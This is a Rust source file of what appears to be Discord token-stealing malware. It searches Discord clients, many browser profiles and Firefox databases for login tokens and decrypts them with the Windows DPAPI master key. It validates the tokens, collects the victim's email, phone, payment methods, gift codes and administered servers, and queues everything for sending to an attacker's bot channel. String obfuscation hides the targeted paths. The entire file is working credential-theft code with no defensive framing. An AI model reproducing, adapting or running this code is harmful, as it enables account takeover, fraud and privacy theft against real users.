use std::{path::Path, fs::{self, File}, io::{BufReader,Read}, slice, collections::HashMap};
use aes_gcm::{Aes256Gcm, KeyInit,aead::{generic_array::GenericArray, Aead}};
use reqwest::{StatusCode};
use serde_json::{Value, json};
use windows::{Win32::Security::Cryptography::{CryptUnprotectData, CRYPT_INTEGER_BLOB}};
use obfstr::*;
use bstr::BString;
use crate::BOT_TO_SEND;
struct ExtractTokens {
    tokens: HashMap<String, String>
}
pub struct FetchTokens {
    tokens: ExtractTokens,
}
impl ExtractTokens {
    pub async fn new() -> Self {
        ExtractTokens {
            tokens: HashMap::new()
        }
    }
    pub async fn extract(&mut self) {
        let appdata_os= std::env::var_os("localappdata").unwrap_or("".into());
        let appdata= appdata_os.to_str().unwrap_or("");
        let roaming_os= std::env::var_os("appdata").unwrap_or("".into());
        let roaming= roaming_os.to_str().unwrap_or("");
        let paths= [
            [obfstr!("Discord").to_string(), (roaming.to_owned() + obfstr!("\\discord\\Local Storage\\leveldb\\"))],
            [obfstr!("Discord Canary").to_string(), (roaming.to_owned() + obfstr!("\\discordcanary\\Local Storage\\leveldb\\"))],
            [obfstr!("Lightcord").to_string(), (roaming.to_owned() + obfstr!("\\Lightcord\\Local Storage\\leveldb\\"))],
            [obfstr!("Discord PTB").to_string(), (roaming.to_owned() + obfstr!("\\discordptb\\Local Storage\\leveldb\\"))],
            [obfstr!("Opera").to_string(), (roaming.to_owned() + obfstr!("\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\"))],
            [obfstr!("Opera GX").to_string(), (roaming.to_owned() + obfstr!("\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\"))],
            [obfstr!("Amigo").to_string(), (appdata.to_owned() + obfstr!("\\Amigo\\User Data\\Local Storage\\leveldb\\"))],
            [obfstr!("Torch").to_string(), (appdata.to_owned() + obfstr!("\\Torch\\User Data\\Local Storage\\leveldb\\"))],
            [obfstr!("Kometa").to_string(), (appdata.to_owned() + obfstr!("\\Kometa\\User Data\\Local Storage\\leveldb\\"))],
            [obfstr!("Orbitum").to_string(), (appdata.to_owned() + obfstr!("\\Orbitum\\User Data\\Local Storage\\leveldb\\"))],
            [obfstr!("CentBrowser").to_string(), (appdata.to_owned() + obfstr!("\\CentBrowser\\User Data\\Local Storage\\leveldb\\"))],
            [obfstr!("7Star").to_string(), (appdata.to_owned() + obfstr!("\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\"))],
            [obfstr!("Sputnik").to_string(), (appdata.to_owned() + obfstr!("\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\"))],
            [obfstr!("Vivaldi").to_string(), (appdata.to_owned() + obfstr!("\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\"))],
            [obfstr!("Chrome SxS").to_string(), (appdata.to_owned() + obfstr!("\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\"))],
            [obfstr!("Chrome").to_string(), (appdata.to_owned() + obfstr!("\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\"))],
            [obfstr!("Chrome1").to_string(), (appdata.to_owned() + obfstr!("\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\"))],
            [obfstr!("Chrome2").to_string(), (appdata.to_owned() + obfstr!("\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\"))],
            [obfstr!("Chrome3").to_string(), (appdata.to_owned() + obfstr!("\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\"))],
            [obfstr!("Chrome4").to_string(), (appdata.to_owned() + obfstr!("\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\"))],
            [obfstr!("Chrome5").to_string(), (appdata.to_owned() + obfstr!("\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\"))],
            [obfstr!("Epic Privacy Browser").to_string(), (appdata.to_owned() + obfstr!("\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\"))],
            [obfstr!("Microsoft Edge").to_string(), (appdata.to_owned() + obfstr!("\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\"))],
            [obfstr!("Uran").to_string(), (appdata.to_owned() + obfstr!("\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\"))],
            [obfstr!("Yandex").to_string(), (appdata.to_owned() + obfstr!("\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\"))],
            [obfstr!("Brave").to_string(), (appdata.to_owned() + obfstr!("\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\"))],
            [obfstr!("Iridium").to_string(), (appdata.to_owned() + obfstr!("\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\"))]
        ];
        let mut thread= None;
        if Path::new(&(roaming.to_owned() + obfstr!("\\Mozilla\\Firefox\\Profiles"))).exists() {
            thread= Some(tokio::spawn(async {
                let mut thread_tokens= HashMap::new();
                let roaming_os= std::env::var_os("appdata").unwrap_or("".into());
                let roaming= roaming_os.to_str().unwrap_or("");
                let mut to_discover= vec![roaming.to_owned() + obfstr!("\\Mozilla\\Firefox\\Profiles")];
                while !to_discover.is_empty() {
                    if let Ok(dir)= fs::read_dir(Path::new(&to_discover.remove(0))) {
                        for entry in dir.flatten() {
                            let epath= entry.path().to_string_lossy().to_string();
                            if let Ok(ft)= entry.file_type() {
                                if ft.is_dir() {
                                    to_discover.push(epath);
                                    continue;
                                }
                            }
                            if epath.ends_with(".sqlite") {
                                if let Ok(f)= File::open(epath) {
                                    let mut f= BufReader::new(f);
                                    let mut v= Vec::new();
                                    let _= f.read_to_end(&mut v);
                                    let mut index= 0;
                                    loop {
                                        if index + 12< v.len() {
                                            if v[index]== b'-' || (v[index]>= b'0' && v[index]<= b'9') || (v[index]>= b'A' && v[index]<= b'Z') || v[index]== b'_' || (v[index]>= b'a' && v[index]<= b'z') {
                                                let mut index2= index + 1;
                                                let mut first_pattern: u8= 1;
                                                'pattern: for _ in 1..24 {
                                                    if index2< v.len() {
                                                        if v[index2]== b'-' || (v[index2]>= b'0' && v[index2]<= b'9') || (v[index2]>= b'A' && v[index2]<= b'Z') || v[index2]== b'_' || (v[index2]>= b'a' && v[index2]<= b'z') {
                                                            first_pattern= first_pattern.saturating_add(1);
                                                            index2+= 1;
                                                        }else{
                                                            break 'pattern;
                                                        }
                                                    }
                                                }
                                                if first_pattern== 24 && index2< v.len() && v[index2]== b'.' {
                                                    index2+= 1;
                                                    let mut second_pattern: u8= 0;
                                                    'pattern: for _ in 0..6 {
                                                        if index2< v.len() {
                                                            if v[index2]== b'-' || (v[index2]>= b'0' && v[index2]<= b'9') || (v[index2]>= b'A' && v[index2]<= b'Z') || v[index2]== b'_' || (v[index2]>= b'a' && v[index2]<= b'z') {
                                                                second_pattern= second_pattern.saturating_add(1);
                                                                index2+= 1;
                                                            }
                                                        }else{
                                                            break 'pattern;
                                                        }
                                                    }
                                                    if second_pattern== 6 && index2< v.len() && v[index2]== b'.' {
                                                        index2+= 1;
                                                        let mut third_pattern: u8= 0;
                                                        'pattern: for _ in 0..110 {
                                                            if index2< v.len() {
                                                                if v[index2]== b'-' || (v[index2]>= b'0' && v[index2]<= b'9') || (v[index2]>= b'A' && v[index2]<= b'Z') || v[index2]== b'_' || (v[index2]>= b'a' && v[index2]<= b'z') {
                                                                    third_pattern= third_pattern.saturating_add(1);
                                                                    index2+= 1;
                                                                }
                                                            }else{
                                                                break 'pattern;
                                                            }
                                                        }
                                                        if third_pattern>= 25 {
                                                            let token= String::from_utf8(v[index..index2].to_vec()).unwrap_or(String::new());
                                                            if let std::collections::hash_map::Entry::Vacant(e)= thread_tokens.entry(token.clone()) {
                                                                let result= ExtractTokens::validate_token(&token).await;
                                                                if result.0 {
                                                                    e.insert(result.1);
                                                                }
                                                            }
                                                            index= index2;
                                                        }
                                                    }
                                                    
                                                }
                                            }
                                            index+= 1;
                                        }else{
                                            break;
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
                thread_tokens
            }));
        }
        for [name, path] in paths {
            if !Path::new(&path).exists() {
                continue;
            }
            let _discord= name.replace(' ', "").to_lowercase();
            if path.contains("cord") {
                if !Path::new(&(roaming.to_owned() + &format!("\\{_discord}\\Local State"))).exists() {
                    continue;
                }
                if let Ok(dir)= fs::read_dir(&path) {
                    for dirfile in dir.flatten() {
                        let filename= dirfile.file_name().to_string_lossy().to_string();
                        for endpath in ["log", "ldb"] {
                            if filename.ends_with(endpath) {
                                if let Ok(f)= File::open(format!("{}\\{filename}", &path)) {
                                    let mut f= BufReader::new(f);
                                    let mut v= Vec::new();
                                    let _= f.read_to_end(&mut v);
                                    let mut index= 0;
                                    loop {
                                        if index + 12< v.len() {
                                            if &v[index..index + 12]== b"dQw4w9WgXcQ:" {
                                                let mut index2= index;
                                                while index2< v.len() {
                                                    if v[index2]== b'\"' {
                                                        if let Ok(value)= rbase64::decode(&String::from_utf8_lossy(&v[index + 12..index2])) {
                                                            let token= ExtractTokens::decrypt_value(value, ExtractTokens::get_master_key(roaming.to_owned() + format!("\\{_discord}\\Local State").as_str()));
                                                            if let std::collections::hash_map::Entry::Vacant(e)= self.tokens.entry(token.clone()) {
                                                            let result= ExtractTokens::validate_token(&token).await;
                                                                if result.0 {
                                                                    e.insert(result.1);
                                                                }
                                                            }
                                                            break;
                                                        }
                                                    }else{
                                                        index2+= 1;
                                                    }
                                                }
                                            }
                                            index+= 1;
                                        }else{
                                            break;
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }else if let Ok(dir)= fs::read_dir(&path) {
                for dirfile in dir.flatten() {
                    let filename= dirfile.file_name().to_string_lossy().to_string();
                    if filename.ends_with("log") || filename.ends_with("ldb") {
                        if let Ok(f)= File::open(format!("{}\\{filename}", &path)) {
                            let mut f= BufReader::new(f);
                            let mut v= Vec::new();
                            let _= f.read_to_end(&mut v);
                            let mut index= 0;
                            loop {
                                if index + 12< v.len() {
                                    if v[index]== b'-' || (v[index]>= b'0' && v[index]<= b'9') || (v[index]>= b'A' && v[index]<= b'Z') || v[index]== b'_' || (v[index]>= b'a' && v[index]<= b'z') {
                                        let mut index2= index + 1;
                                        let mut first_pattern: u8= 1;
                                        'pattern: for _ in 1..24 {
                                            if index2< v.len() {
                                                if v[index2]== b'-' || (v[index2]>= b'0' && v[index2]<= b'9') || (v[index2]>= b'A' && v[index2]<= b'Z') || v[index2]== b'_' || (v[index2]>= b'a' && v[index2]<= b'z') {
                                                    first_pattern= first_pattern.saturating_add(1);
                                                    index2+= 1;
                                                }else{
                                                    break 'pattern;
                                                }
                                            }
                                        }
                                        if first_pattern== 24 && index2< v.len() && v[index2]== b'.' {
                                            index2+= 1;
                                            let mut second_pattern: u8= 0;
                                            'pattern: for _ in 0..6 {
                                                if index2< v.len() {
                                                    if v[index2]== b'-' || (v[index2]>= b'0' && v[index2]<= b'9') || (v[index2]>= b'A' && v[index2]<= b'Z') || v[index2]== b'_' || (v[index2]>= b'a' && v[index2]<= b'z') {
                                                        second_pattern= second_pattern.saturating_add(1);
                                                        index2+= 1;
                                                    }
                                                }else{
                                                    break 'pattern;
                                                }
                                            }
                                            if second_pattern== 6 && index2< v.len() && v[index2]== b'.' {
                                                index2+= 1;
                                                let mut third_pattern: u8= 0;
                                                'pattern: for _ in 0..110 {
                                                    if index2< v.len() {
                                                        if v[index2]== b'-' || (v[index2]>= b'0' && v[index2]<= b'9') || (v[index2]>= b'A' && v[index2]<= b'Z') || v[index2]== b'_' || (v[index2]>= b'a' && v[index2]<= b'z') {
                                                            third_pattern= third_pattern.saturating_add(1);
                                                            index2+= 1;
                                                        }
                                                    }else{
                                                        break 'pattern;
                                                    }
                                                }
                                                if third_pattern>= 25 {
                                                    let token= String::from_utf8(v[index..index2].to_vec()).unwrap_or(String::new());
                                                    if let std::collections::hash_map::Entry::Vacant(e)= self.tokens.entry(token.clone()) {
                                                        let result= ExtractTokens::validate_token(&token).await;
                                                        if result.0 {
                                                            e.insert(result.1);
                                                        }
                                                    }
                                                    index= index2;
                                                }
                                            }
                                            
                                        }
                                    }
                                    index+= 1;
                                }else{
                                    break;
                                }
                            }
                        }
                    }
                }
            }
        }
        if let Some(thread)= thread {
            let thread_tokens= thread.await.unwrap_or(HashMap::new());
            for (token, json) in thread_tokens {
                self.tokens.insert(token.clone(), json);
            }
        }
    }
    async fn validate_token(token: &String) -> (bool, String) {
        let client= reqwest::Client::new();
        if let Ok(request)= client.get(obfstr!("https://discord.com/api/v9/users/@me")).header("Authorization", token).build() {
            if let Ok(response)= client.execute(request).await {
                if response.status()== StatusCode::OK {
                    return (true, response.text().await.unwrap_or(String::new()));
                }
            }
        }
        (false, String::new())
    }
    fn decrypt_value(buff: Vec<u8>, master_key: Vec<u8>) -> String {
        let key= GenericArray::from_slice(&master_key);
        let cipher= Aes256Gcm::new(key);
        let nonce= GenericArray::from_slice(&buff[3..15]);
        BString::new(cipher.decrypt(nonce, &buff[15..]).unwrap_or(Vec::new())).to_string()
    }
    fn get_master_key(path: String) -> Vec<u8> {
        if !Path::new(&path).exists() {
            return Vec::new();
        }
        if let Ok(f)= File::open(&path) {
            let mut f= BufReader::new(f);
            let mut bufs= String::new();
            let _= f.read_to_string(&mut bufs);
            if !bufs.contains("os_crypt") {
                return Vec::new();
            }
            if let Ok(json)= serde_json::from_str::<Value>(&bufs) {
                if let Ok(mut master_key)= rbase64::decode(json["os_crypt"]["encrypted_key"].as_str().unwrap_or("")) {
                    master_key= master_key[5..].to_vec();
                    let mut output= CRYPT_INTEGER_BLOB {
                        cbData: 0,
                        pbData: std::ptr::null_mut()
                    };
                    unsafe {
                        CryptUnprotectData(&CRYPT_INTEGER_BLOB {
                            cbData: master_key.len() as u32,
                            pbData: master_key.as_mut_ptr()
                        }, None, None, None, None, 0, &mut output);
                        drop(master_key);
                        let v= slice::from_raw_parts(output.pbData, output.cbData as usize).to_vec();
                        return v;
                    }
                }
            }
        }
        Vec::new()
    }
}
impl FetchTokens {
    pub async fn new() -> Self {
        let mut tokens= ExtractTokens::new().await;
        tokens.extract().await;
        FetchTokens {
            tokens,
        }
    }
    pub async fn upload(&self, channel: u64) {
        if self.tokens.tokens.is_empty() {
            return;
        }
        let client= reqwest::Client::new();
        for (token, json_string) in &self.tokens.tokens {
            let user: Value= if let Ok(s)= serde_json::from_str(json_string) {s}else{continue};
            let billing= if let Ok(r)= client.execute(
                if let Ok(r)= client.get(obfstr!("https://discord.com/api/v6/users/@me/billing/payment-sources")).header("Authorization", token).build() {r}else{continue}
            ).await {r.json().await.unwrap_or(Value::default())}else{continue};
            let guilds= if let Ok(r)= client.execute(
                if let Ok(r)= client.get(obfstr!("https://discord.com/api/v9/users/@me/guilds?with_counts=true")).header("Authorization", token).build() {r}else{continue}
            ).await {r.json().await.unwrap_or(Value::default())}else{continue};
            let gift_codes= if let Ok(r)= client.execute(
                if let Ok(r)= client.get(obfstr!("https://discord.com/api/v9/users/@me/outbound-promotions/codes")).header("Authorization", token).build() {r}else{continue}
            ).await {r.json().await.unwrap_or(Value::default())}else{continue};
            let username= user["username"].as_str().unwrap_or("Unknown").to_string() + "#" + user["discriminator"].as_str().unwrap_or("0000");
            let user_id= user["id"].as_str().unwrap_or("Unknown").to_string();
            let email= user["email"].as_str().unwrap_or("Unknown").to_string();
            let phone= user["phone"].as_str().unwrap_or("Unknown").to_string();
            let mfa= user["mfa_enabled"].as_bool().unwrap_or(false);
            let gifurl= obfstr!("https://cdn.discordapp.com/avatars/").to_owned() + &format!("{user_id}/{}.gif", user["avatar"].as_str().unwrap_or(""));
            let avatar= if let Ok(r)= client.execute(if let Ok(r)= client.get(&gifurl).header("Authorization", token).build() {r}else{continue}).await {
                if r.status()== StatusCode::OK {
                    gifurl
                }else{
                    obfstr!("https://cdn.discordapp.com/avatars/").to_owned() + &format!("{user_id}/{}.png", user["avatar"].as_str().unwrap_or(""))
                }
            }else{continue};
            let nitro= match user["premium_type"].as_u64().unwrap_or(0) {
                1 => "Nitro Classic",
                2 => "Nitro",
                3 => "Nitro Basic",
                _ => "None"
            };
            let mut payment_method= Vec::new();
            if let Some(billing)= billing.as_array() {
                if !billing.is_empty() {
                    for method in billing {
                        payment_method.push(match method["type"].as_u64().unwrap_or(0) {
                            1 => "Credit Card",
                            2 => "PayPal",
                            _ => "Unknown"
                        });
                    }
                }
            }
            let mut hq_guildss= String::new();
            if let Some(guilds)= guilds.as_array() {
                if !guilds.is_empty() {
                    let mut hq_guilds= Vec::new();
                    for guild in guilds {
                        if guild["permissions"].as_str().unwrap_or("")== "4398046511103" && guild["approximate_member_count"].as_u64().unwrap_or(0)>= 100 { 
                            let owner= if guild["owner"].as_bool().unwrap_or(false) {"✅"}else{"❌"};
                            let invites= if let Ok(r)= client.execute(if let Ok(r)= client.get(obfstr!("https://discord.com/api/v8/guilds/").to_owned() + &format!("{}/invites", guild["id"].as_str().unwrap_or(""))).header("Authorization", token).build() {r}else{continue}).await {r.json::<Value>().await.unwrap_or(Value::default())}else{continue};
                            let mut invite= obfstr!("https://discord.gg/").to_string();
                            if let Some(invites)= invites.as_array() {
                                if !invites.is_empty() {
                                    invite+= invites[0]["code"].as_str().unwrap_or("");
                                }
                            }
                            let guild_member_count= guild["approximate_member_count"].as_u64().unwrap_or(0);
                            let guild_presence_count= guild["approximate_presence_count"].as_u64().unwrap_or(0);
                            let data= format!("\u{200b}\n**{} ({})**\nOwner: `{owner}` | Members: ` ⚫ {} / 🟢 {} / 🔴 {} `\n[Join Server]({invite})",
                                guild["name"].as_str().unwrap_or(""),
                                guild["id"].as_str().unwrap_or(""),
                                guild_member_count,
                                guild_presence_count,
                                guild_member_count - guild_presence_count
                            );
                            if hq_guilds.join("\n").len() + data.len()>= 1024 {
                                break;
                            }
                            hq_guilds.push(data);
                        }
                    }
                    if !hq_guilds.is_empty() {
                        hq_guildss= hq_guilds.join("\n").to_string();
                    }
                }
            }
            let mut codess= String::new();
            if let Some(gift_codes)= gift_codes.as_array() {
                if !gift_codes.is_empty() {
                    let mut codes= Vec::new();
                    for code in gift_codes {
                        let name= code["promotion"]["outbound_title"].as_str().unwrap_or("Unknown");
                        let code= code["code"].as_str().unwrap_or("Unknown");
                        let data= format!(":gift: `{name}`\n:ticket: `{code}`");
                        if codes.join("\n\n").len() + data.len()>= 1024 {
                            break;
                        }
                        codes.push(data);
                    }
                    if !codes.is_empty() {
                        codess= codes.join("\n\n").to_string();
                    }
                }
            }
            BOT_TO_SEND.lock().await.push(json!({
                "channel": channel,
                "react": ["📌"],
                "embed": true,
                "color": 0x0084ff,
                "title": format!("{username} ({user_id})"),
                "thumbnail": avatar,
                "fields": [{
                        "name": "\u{200b}\n📜 Token:",
                        "value": format!("```{token}```\n\u{200b}"),
                        "inline": false
                    }, {
                        "name": "💎 Nitro:",
                        "value": nitro,
                        "inline": false
                    }, {
                        "name": "💳 Billing:",
                        "value": if !payment_method.is_empty() {payment_method.join(", ")}else{"None".into()},
                        "inline": false
                    }, {
                        "name": "🔒 MFA:",
                        "value": format!("{mfa}\n\u{200b}"),
                        "inline": false
                    }, {
                        "name": "📧 Email:",
                        "value": email,
                        "inline": false
                    }, {
                        "name": "📳 Phone:",
                        "value": phone,
                        "inline": false
                    }, {
                        "name": "🏰 HQ Guilds:",
                        "value": if !hq_guildss.is_empty() {hq_guildss}else{"None".to_string()},
                        "inline": false
                    }, {
                        "name": "\u{200b}\n🎁 Gift Codes:",
                        "value": if !codess.is_empty() {codess}else{"None".to_string()},
                        "inline": false
                    }
                ]
            }));
        }
    }
}